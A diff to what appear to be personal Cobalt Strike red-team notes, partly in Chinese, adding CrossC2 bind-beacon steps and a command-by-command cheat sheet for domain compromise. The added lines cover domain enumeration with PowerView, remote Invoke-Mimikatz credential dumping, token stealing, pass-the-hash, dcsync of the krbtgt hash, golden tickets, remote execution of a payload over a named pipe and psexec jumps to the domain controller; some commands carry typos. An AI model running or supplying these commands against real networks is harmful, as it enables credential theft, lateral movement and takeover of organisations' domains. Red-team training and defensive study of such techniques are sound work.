@@ -134,6 +134,9 @@ gcc test.c -fPIC -shared -o lib_rebind_test.so # test2.c中替换了memcpy防止
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
 # bind shell
 ./genCrossC2.Linux 192.168.50.161 4431 ./.cobaltstrike.beacon_keys null Linux-bind x64 t3.out
+## 1. 上面  ip与port字段无需考虑
+## 2. 内网中的目标运行 ./MacOS-bind.beacon <port> 开启服务
+## 3. 在网络联通的session中运行 connect <targetIP>:<port>
 ```
 
 ### 代理服务器
@@ -296,9 +299,95 @@ __Credentials and Hashes__
   * `mimikatz !lasdump::sam` for local
 * `View -> Credentials` to manage
 
+### Domain
+[Link](https://www.youtube.com/watch?v=QF_6zFLmLn0)
+
+```sh
+beacon > net domain
+beacon > net computers
+beacon > powershell-import /root/PowerSpLoit/Recon/Powerview.ps1
+beacon > powerpick Get-NetDomain
+beacon > powerpick Get-NetDomainController
+beacon > powerpick Get-NetComputer
+beacon > run wmic computersystem get domain
+beacon > run nltest /dclist:corp.acme.com
+beacon > run c:\windows\sysnative\nltest.exe /dclist:corp.acme.com
+beacon > run net group "Domain Controllers" /DOMAIN
+beacon > run net group "Domain Computers"/DOMAIN
+beacon > powerpick Find-LocalAdminAccess
+beacon > run net group "domain admins" /DOMAIN  # 显示sqladmin 
+beacon > net group \\DC.CORP.ACHE.COH Domain Admins # 同上
+beacon > net localgroup \\FILESERVER Administrators
+# 直接右击Session - File Explorer, 可在地址栏输入 \\FILESERVER
+beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock {dir c:\ }
+beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock { systeminfo }
+beacon > powershell-import /root/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
+beacon > powerpick Invoke-Mimikatz -ComputerName FILESERVER
+```
+
+__Steal Token__
+
+1. 没有权限，先看processlist, 然后 steal token, 再ls(有权限了)
+2. file explorer: `\\DC\C$` 上传
+3. remote-exec wmi DC c:\windows\temp\shell.exe -mon \\.\pipe\monitorsrv
+4. link DC xxx
+```sh
+Process List: 按User排序，偷一个其他用户 点击其他用户进程, 点击: Steal Token
+# 或者 beacon > steal_token 8068
+beacon > ls \\FILESERVER\C$
+beacon > rev2self # revert token
+```
+
+__Pass-the-Hash__
+```sh
+beacon > spawnto x64 c:\windows\system32\dllhost.exe
+# Pth 攻击
+# 右击 Beacon 窗口 : Access - Make Token 
+## 从DC中提取密码哈希, hashdump好像也行
+beacon > dcsync CORP.ACME.COM CORP\krbtgt
+```
+
+__Kerberos Tickets__
+```sh
+beacon > whoami /user # sid
+beacon > net domain # corp.acme.com
+# 右击 Beacon 窗口 : Access - Golden Ticket
+beacon > run klist
+beacon > run c:\wwindows\sysnative\klist
+beacon > ls \\DC.CORP.ACME.COM\C$\
+```
+
+```sh
+beacon > jump
+beacon > jump psexec64 DC local - smb
+# jump - winrm64
+```
+
+upload file
+```sh
+cd \\host\C$\windows\temp
+upload /path/to/file.exe
+```
+
+__Run an Artifact__
+* List remote execute methods:
+  - `remote-exec`
+* Run a command on remote target
+  - `emote-exec [method][target][command]`
+
+
+| Module | Description                                      |
+| ------ | ------------------------------------------------ |
+| psexec | Run command via a new service                    |
+| winrm  | Run PowerShell expression via WinRM (PowerShell) |
+| wir    | Run command via WinRM (PowerShell)               |
+
+beacon > 
+
 ## Plugins
 
 ### CrossC2/上线Linux
+有问题时看 CS: View - Weblog
 
 __使用profile__
 
